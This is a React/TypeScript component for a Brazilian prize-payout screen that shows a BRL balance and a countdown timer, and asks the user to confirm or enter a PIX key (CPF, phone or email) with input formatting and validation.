import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Copy, CheckCircle2, ArrowRight, ChevronDown } from 'lucide-react';
import { Timer } from './Timer';

interface PixScreenProps {
  balance: number;
  onSubmit: () => void;
  userCpf?: string;
}

export const PixScreen: React.FC<PixScreenProps> = ({ balance, onSubmit, userCpf }) => {
  const [showKeyTypeSelector, setShowKeyTypeSelector] = useState(false);
  const [pixType, setPixType] = useState<'cpf' | 'telefone' | 'email'>('cpf');
  const [pixKey, setPixKey] = useState(userCpf || '');
  const [copied, setCopied] = useState(false);

  const formatCurrency = (value: number) => {
    return new Intl.NumberFormat('pt-BR', {
      style: 'currency',
      currency: 'BRL'
    }).format(value);
  };

  const formatPixKey = (value: string, type: 'cpf' | 'telefone' | 'email') => {
    if (type === 'cpf') {
      return value
        .replace(/\D/g, '')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d{1,2})$/, '$1-$2')
        .slice(0, 14);
    } else if (type === 'telefone') {
      return value
        .replace(/\D/g, '')
        .replace(/(\d{2})(\d)/, '($1) $2')
        .replace(/(\d{5})(\d)/, '$1-$2')
        .slice(0, 15);
    }
    return value;
  };

  const handlePixKeyChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    if (pixType === 'email') {
      setPixKey(value.toLowerCase());
    } else {
      const formatted = formatPixKey(value, pixType);
      setPixKey(formatted);
    }
  };

  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(pixKey);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Failed to copy:', err);
    }
  };

  const getPlaceholder = () => {
    switch (pixType) {
      case 'cpf':
        return '000.000.000-00';
      case 'telefone':
        return '(00) 00000-0000';
      case 'email':
        return 'seu.email@exemplo.com';
      default:
        return '';
    }
  };

  const isValidKey = () => {
    if (!showKeyTypeSelector && userCpf) return true;
    
    switch (pixType) {
      case 'cpf':
        return pixKey.replace(/\D/g, '').length === 11;
      case 'telefone':
        return pixKey.replace(/\D/g, '').length === 11;
      case 'email':
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(pixKey);
      default:
        return false;
    }
  };

  return (
    <motion.div 
      className="bg-white/95 backdrop-blur-xl rounded-xl shadow-2xl p-8 max-w-md w-full text-center relative z-10"
      initial={{ scale: 0.9, opacity: 0 }}
      animate={{ scale: 1, opacity: 1 }}
      transition={{ duration: 0.5 }}
    >
      <div className="absolute top-4 right-4">
        <Timer duration={300} onComplete={onSubmit} variant="warning" />
      </div>

      <motion.h1 
        className="text-3xl font-bold text-gray-800 mb-4"
        initial={{ y: 20, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        transition={{ delay: 0.4 }}
      >
        Receba seu Prêmio!
      </motion.h1>

      <motion.p 
        className="text-lg text-gray-600 mb-6"
        initial={{ y: 20, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        transition={{ delay: 0.5 }}
      >
        Confirme sua chave PIX para receber
      </motion.p>

      <motion.div
        className="text-4xl font-bold text-[#FFB800] mb-8"
        initial={{ scale: 0.8, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ delay: 0.6 }}
      >
        {formatCurrency(balance)}
      </motion.div>

      {!showKeyTypeSelector && userCpf ? (
        <motion.div
          className="space-y-4"
          initial={{ y: 20, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          transition={{ delay: 0.7 }}
        >
          <div className="bg-gray-50 p-4 rounded-lg">
            <div className="text-sm text-gray-500 mb-2">Sua chave PIX (CPF)</div>
            <div className="text-lg font-medium text-gray-800">{userCpf}</div>
          </div>
          
          <button
            onClick={() => setShowKeyTypeSelector(true)}
            className="w-full py-3 px-4 rounded-lg border-2 border-gray-200 text-gray-600 hover:bg-gray-50 transition-colors flex items-center justify-center gap-2"
          >
            Usar outra chave PIX
            <ChevronDown className="w-4 h-4" />
          </button>
        </motion.div>
      ) : (
        <>
          <motion.div 
            className="grid grid-cols-3 gap-2 mb-6"
            initial={{ y: 20, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            transition={{ delay: 0.7 }}
          >
            <button
              className={`py-3 px-4 rounded-lg font-medium transition-all duration-300 ${
                pixType === 'cpf' 
                  ? 'bg-[#FFB800] text-white shadow-lg scale-105' 
                  : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
              }`}
              onClick={() => setPixType('cpf')}
            >
              CPF
            </button>
            <button
              className={`py-3 px-4 rounded-lg font-medium transition-all duration-300 ${
                pixType === 'telefone' 
                  ? 'bg-[#FFB800] text-white shadow-lg scale-105' 
                  : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
              }`}
              onClick={() => setPixType('telefone')}
            >
              Telefone
            </button>
            <button
              className={`py-3 px-4 rounded-lg font-medium transition-all duration-300 ${
                pixType === 'email' 
                  ? 'bg-[#FFB800] text-white shadow-lg scale-105' 
                  : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
              }`}
              onClick={() => setPixType('email')}
            >
              Email
            </button>
          </motion.div>

          <motion.div 
            className="relative mb-6"
            initial={{ y: 20, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            transition={{ delay: 0.8 }}
          >
            <input
              type={pixType === 'email' ? 'email' : 'text'}
              value={pixKey}
              onChange={handlePixKeyChange}
              placeholder={getPlaceholder()}
              className="w-full px-4 py-3 rounded-lg border-2 border-gray-200 focus:border-[#FFB800] focus:outline-none text-lg"
              maxLength={pixType === 'cpf' ? 14 : pixType === 'telefone' ? 15 : undefined}
            />
            <button
              onClick={copyToClipboard}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors"
            >
              {copied ? <CheckCircle2 className="w-5 h-5 text-green-500" /> : <Copy className="w-5 h-5" />}
            </button>
          </motion.div>
        </>
      )}

      <motion.button
        onClick={onSubmit}
        disabled={!isValidKey()}
        className={`w-full py-4 px-6 rounded-lg font-semibold transition-all duration-300 flex items-center justify-center gap-2 ${
          !isValidKey()
            ? 'bg-gray-200 text-gray-400 cursor-not-allowed'
            : 'bg-gradient-to-r from-[#FFB800] to-[#FFD100] text-white hover:shadow-lg hover:scale-105'
        }`}
        initial={{ y: 20, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        transition={{ delay: 0.9 }}
        whileHover={isValidKey() ? { scale: 1.05 } : {}}
        whileTap={isValidKey() ? { scale: 0.95 } : {}}
      >
        Continuar
        <ArrowRight className="w-5 h-5 transform group-hover:translate-x-1 transition-transform" />
      </motion.button>

      <motion.p
        className="mt-4 text-sm text-gray-500"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 1 }}
      >
        Você receberá o pagamento na chave PIX selecionada
      </motion.p>
    </motion.div>
  );
};